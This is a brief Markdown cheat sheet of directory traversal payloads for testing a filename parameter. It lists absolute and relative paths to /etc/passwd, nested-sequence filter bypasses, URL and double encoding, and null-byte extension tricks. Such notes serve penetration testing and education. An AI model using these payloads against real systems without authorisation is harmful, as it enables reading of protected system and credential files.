---
description: >-
  Here's more of a cheatsheet some attacks to try when testing for Directory
  Traversal
---

# Directory Traversal



_**Testing Absolute Path:**_

```
filename=/etc/passwd
```



Testing Relative Path:

```
filename=../../../etc/passwd
```

_**Try to bypass filters:**_

You might be able to use nested traversal sequences, such as `....//` or `....\/`,

_**Encoding:**_

`%2e%2e%2f`

_**Double Encoding:**_

`%252e%252e%252f`



If an application requires that a user-supplied filename must end with an a file extension, try terminating it with a null-byte.

```
filename=../../../etc/passwd%00.png
```
